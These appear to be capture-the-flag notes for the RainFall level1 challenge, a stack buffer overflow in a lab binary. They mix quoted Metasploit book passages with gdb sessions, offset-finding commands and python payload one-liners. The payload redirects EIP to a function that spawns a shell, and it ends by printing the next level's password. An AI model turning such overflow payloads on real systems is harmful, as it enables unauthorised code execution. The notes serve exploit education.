
level1@RainFall:~$ ./level1 <<< $(python -c 'print("a" * 76)')
Illegal instruction (core dumped)



 the first step in exploitation is to find out the offset. Metasploit aids this process by using two different tools, called pattern_create and pattern_offset.

 in order to build a working exploit, we need to figure out the exact amount of these characters. Metasploit's inbuilt tool called the pattern_create does this for us in no time. It generates patterns that can be supplied instead of A characters and, based on the value which overwrote the EIP register, we can easily figure out the exact number of bytes using its counterpart tool pattern_offset.
- Metasploit Revealed _ Secrets of the Expert Pentester (2017) pp 318


./pattern create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

this output can be fed to the vulnerable application as follows:
(gdb) run <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? () 

We have 0x63413563 as the address that overwrote EIP register.

Let's figure out the exact number of bytes required to overwrite the EIP with the pattern_offset tool. This tool takes two arguments; the first one is the address and the second one is the length, which was 200 as generated using pattern_create:

./pattern offset 0x63413563 200
76

The exact match is found to be at 76. Therefore, any 4 bytes after 76 characters becomes the contents of the EIP register.

- Metasploit Revealed _ Secrets of the Expert Pentester (2017) pp 318-320

lets make sure of the above finding:

(gdb) run <<< $(python -c 'print "-" * 76 + "AAAA" ')
Segmentation fault.
0x41414141 in ??

```
The cause of crash was that the application failed to process the address of the next instruction, located at 41414141. The value 41 is the hexadecimal representation of character A. What actually happened is that our input, extending through the boundary of the buffer, went on to overwrite the EIP register. Therefore, since the address of the next instruction was overwritten, the program tried to find the address of the next instruction at 41414141, which was not a valid address. Hence, it crashed.

- Metasploit Revealed _ Secrets of the Expert Pentester (2017) pp 316
```

(gdb) info func
All defined functions:
[..]
0x08048444  run

b.Ninja for run func:
```
fwrite {"Good... Wait what?\n"}
return system(/bin/sh)
```
0x08048444 little endian : \x44\x84\x04\x08

all what we need to do is make the EIP point to the addr of run function which runs the shell

python -c 'import struct; print("-" * 76 + struct.pack(">L",0x44840408))' > /tmp/payload

python -c 'print "-" * 76 + "\x44\x84\x04\x08"' > /tmp/test

level1@RainFall:~$ cat /tmp/payload -  | ./level1
Good... Wait what?
pwd
/home/user/level1
cat /home/user/level1/.pass
cat: /home/user/level1/.pass: Permission denied
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77



==
struct = Interpret bytes as packed binary data
struct.pack takes non-byte values (e.g. integers, strings, etc.) and converts them to bytes.
Format Strings
< little-endian
> big-endian


Payload: This is a piece of code that runs at the target after a successful exploitation is done. It defines the actions we want to perform on the target system.

Payloads
To understand what a payload does, let's consider a real-world example. A military unit of a certain country develops a new missile that can travel a range of 500 km at very high speed. Now, the missile body itself is of no use unless it's filled with the right kind of ammunition. Now, the military unit decided to load high explosive material within the missile so that when the missile hits the target, the explosive material within the missile explodes and causes the required damage to the enemy. So, in this case, the high explosive material within the missile is the payload. The payload can be changed based on the severity of damage that is to be caused after the missile is fired.
Similarly, payloads in the Metasploit Framework let us decide what action is to be performed on the target system once the exploit is successful. 

- Metasploit Revealed _ Secrets of the Expert Pentester -  Build your Defense against Complex Attacks-Packt Publishing (2017)

==
to detect the offset u could also use the cyclic script from the pawn tools 

https://github.com/arthaud/python3-pwntools/blob/master/pwnlib/commandline/cyclic.py

cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

run <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"

Segmentation fault.

eip value 0x61616174 

hex 0x61616174 to text is: "aaat" but since LSB it's "taaa"

using cyclic again:

cyclic -l taaa

76

r <<< $(python -c 'print ("A" * 76 + "B")')




